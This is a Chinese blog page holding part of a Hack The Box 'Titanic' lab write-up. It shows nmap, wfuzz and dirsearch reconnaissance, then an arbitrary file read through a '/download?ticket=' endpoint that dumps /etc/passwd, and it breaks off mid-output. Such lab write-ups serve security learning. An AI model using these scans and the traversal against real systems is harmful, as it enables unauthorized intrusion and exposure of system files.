<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1e38cf25637a4908.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1e38cf25637a4908.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-81a2b7b9623e52f7.js" defer=""></script><script src="/_next/static/Ccn3Uy_j8m9kBQAk6sKIJ/_buildManifest.js" defer=""></script><script src="/_next/static/Ccn3Uy_j8m9kBQAk6sKIJ/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason7-Titanic","contentHtml":"\u003ch1\u003eSeason7-Titanic\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/competitive/7/overview\"\u003ehttps://app.hackthebox.com/competitive/7/overview\u003c/a\u003e | \u003ccode\u003eesay\u003c/code\u003e | 漏洞有点难找，我觉得中等左右\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eroot@kali  ~/Desktop/test/test  nmap -sT -\u003cspan class=\"hljs-built_in\"\u003emin\u003c/span\u003e-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.55\u003c/span\u003e  \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 08:06 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.55\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.12\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65251\u003c/span\u003e filtered tcp ports (no-response), \u003cspan class=\"hljs-number\"\u003e282\u003c/span\u003e closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e31.62\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eroot@kali  ~/Desktop/test/test  nmap -sT -A -T4 -O -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.55\u003c/span\u003e      \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 08:06 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.55\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.16\u003c/span\u003es latency).\n\nPORT   STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e8.9\u003c/span\u003ep1 Ubuntu 3ubuntu0\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e (Ubuntu Linux; protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n| ssh-hostkey: \n|   \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e73\u003c/span\u003e:03:9c:\u003cspan class=\"hljs-number\"\u003e76\u003c/span\u003e:eb:04:f1:fe:c9:e9:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e:9c:7f:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e (ECDSA)\n|_  \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e d5:bd:1d:5e:9a:\u003cspan class=\"hljs-number\"\u003e86\u003c/span\u003e:1c:eb:\u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e63\u003c/span\u003e:4d:5f:\u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e:4b:7e:04 (ED25519)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\n|_http-server-header: Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e (Ubuntu)\n|_http-title: Did \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e follow redirect to http://titanic.htb/\nWarning: OSScan results may be unreliable because we could \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nAggressive OS guesses: Linux \u003cspan class=\"hljs-number\"\u003e4.15\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e5.8\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e%), Linux \u003cspan class=\"hljs-number\"\u003e5.3\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e5.4\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e%), Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.32\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e%), Linux \u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e5.5\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e%), Linux \u003cspan class=\"hljs-number\"\u003e3.1\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e%), Linux \u003cspan class=\"hljs-number\"\u003e3.2\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e%), AXIS \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e10A \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e211\u003c/span\u003e Network Camera (Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.17\u003c/span\u003e) (\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e%), ASUS RT-N56U WAP (Linux \u003cspan class=\"hljs-number\"\u003e3.4\u003c/span\u003e) (\u003cspan class=\"hljs-number\"\u003e93\u003c/span\u003e%), Linux \u003cspan class=\"hljs-number\"\u003e3.16\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e93\u003c/span\u003e%), Linux \u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e93\u003c/span\u003e%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (test conditions non-ideal).\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e hops\nService Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/icmp)\nHOP RTT       ADDRESS\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e159.22\u003c/span\u003e ms \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e126.49\u003c/span\u003e ms \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.55\u003c/span\u003e\n\nOS \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Service detection performed. Please report \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e incorrect results at https://nmap.org/submit/ .\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e31.79\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eroot@kali  ~/Desktop/test/test  nmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.55\u003c/span\u003e      \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 08:08 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.55\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.11\u003c/span\u003es latency).\n\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n|_http-dombased-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any DOM based XSS.\n|_http-stored-xss: Couldn'\u003c/span\u003et find \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e stored XSS vulnerabilities.\n|_http-csrf: Couldn\u003cspan class=\"hljs-string\"\u003e't find any CSRF vulnerabilities.\n\nNmap done: 1 IP address (1 host up) scanned in 49.50 seconds\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e子域名查询，发现\u003ccode\u003edev\u003c/code\u003e，添加到\u003ccode\u003ehosts\u003c/code\u003e里面去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~  wfuzz -c -w ~/Desktop/\u003cspan class=\"hljs-type\"\u003eDict\u003c/span\u003e/SecLists-\u003cspan class=\"hljs-number\"\u003e2024.3\u003c/span\u003e/Discovery/DNS/subdomains-top1million-\u003cspan class=\"hljs-number\"\u003e5000.\u003c/span\u003etxt --hl=\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e -H \u003cspan class=\"hljs-string\"\u003e'Host:FUZZ.titanic.htb'\u003c/span\u003e -u titanic.htb\n********************************************************\n* Wfuzz \u003cspan class=\"hljs-number\"\u003e3.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://titanic.htb/\nTotal requests: \u003cspan class=\"hljs-number\"\u003e4989\u003c/span\u003e\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                                           \n=====================================================================\n\n000000019:   \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e        \u003cspan class=\"hljs-number\"\u003e275\u003c/span\u003e L    \u003cspan class=\"hljs-number\"\u003e1278\u003c/span\u003e W     \u003cspan class=\"hljs-number\"\u003e13870\u003c/span\u003e Ch    \u003cspan class=\"hljs-string\"\u003e\"dev\"\u003c/span\u003e                                                                                                                                             \n^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e: UserWarning:Finishing pending requests...\n\nTotal time: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\nProcessed Requests: \u003cspan class=\"hljs-number\"\u003e147\u003c/span\u003e\nFiltered Requests: \u003cspan class=\"hljs-number\"\u003e146\u003c/span\u003e\nRequests/sec.: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问\u003ccode\u003edev\u003c/code\u003e ，\u003ccode\u003egitea\u003c/code\u003e服务\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Titanic/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e访问\u003ccode\u003eHTTP\u003c/code\u003e服务，是关于泰塔尼克号的订票服务\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Titanic/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e点击\u003ccode\u003eBookYourTrip\u003c/code\u003e ，会弹出输入框，填完信息后会下载一个\u003ccode\u003eJson\u003c/code\u003e文件，可能存在\u003ccode\u003ejson\u003c/code\u003e注入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Titanic/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e并且接口是\u003ccode\u003e/download?ticket=\u003c/code\u003e ，可能会存在任意文件下载\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Titanic/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e扫描目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~  dirsearch -u http://titanic.htb -x \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e -e php,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e: DeprecationWarning: pkg_resources \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e deprecated \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e pkg_resources \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, \u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e, txt | HTTP method: GET | Threads: \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e | Wordlist size: \u003cspan class=\"hljs-number\"\u003e10439\u003c/span\u003e\n\nOutput File: /root/reports/http_titanic.htb/_25-02-\u003cspan class=\"hljs-number\"\u003e20_08\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e02.\u003c/span\u003etxt\n\nTarget: http://titanic.htb/\n\n[08:\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:02] Starting: \n[08:\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e405\u003c/span\u003e -  153B  - /book                                             \n[08:\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e400\u003c/span\u003e -   41B  - /download                                         \n                                                                             \nTask Completed\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e任意文件读取\u003c/h2\u003e\n\u003cp\u003e上面拿到了下载文件的接口，尝试读取\u003ccode\u003e/etc/passwd\u003c/code\u003e ，成功读取\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Titanic/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eroot:x:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:root:/root:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash\ndaemon:x:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e:daemon:/usr/sbin:/usr/sbin/nologin\n\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e:x:\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e:\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e:/usr/sbin/nologin\nsys:x:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e:sys:/dev:/usr/sbin/nologin\nsync:x:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e65534\u003c/span\u003e:sync:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sync\ngames:x:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e:games:/usr/games:/usr/sbin/nologin\nman:x:\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:man:/var/cache/man:/usr/sbin/nologin\nlp:x:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e:mail:/var/mail:/usr/sbin/nologin\nnews:x:\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:proxy:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e:/usr/sbin/nologin\nwww-data:x:\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e:www-data:/var/www:/usr/sbin/nologin\nbackup:x:\u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e:backup:/var/backups:/usr/sbin/nologin\n\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e:x:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e:Mailing \u003cspan class=\"hljs-type\"\u003eList\u003c/span\u003e Manager:/var/\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e:/usr/sbin/nologin\nirc:x:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:\u003cspan class=\"hljs-number\"\u003e65534\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e65534\u003c/span\u003e:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e65534\u003c/span\u003e::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:\u003cspan class=\"hljs-number\"\u003e101\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e102\u003c/span\u003e:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:\u003cspan class=\"hljs-number\"\u003e102\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e103\u003c/span\u003e:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:\u003cspan class=\"hljs-number\"\u003e103\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e104\u003c/span\u003e::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:\u003cspan class=\"hljs-number\"\u003e104\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e105\u003c/span\u003e:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\npollinate:x:\u003cspan class=\"hljs-number\"\u003e105\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e::/var/cache/pollinate:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/false\nsshd:x:\u003cspan class=\"hljs-number\"\u003e106\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e65534\u003c/span\u003e::/run/sshd:/usr/sbin/nologin\nsyslog:x:\u003cspan class=\"hljs-number\"\u003e107\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e113\u003c/span\u003e::/home/syslog:/usr/sbin/nologin\nuuidd:x:\u003cspan class=\"hljs-number\"\u003e108\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e114\u003c/span\u003e::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:\u003cspan class=\"hljs-number\"\u003e109\u003c/span\u003e:\u003cspan 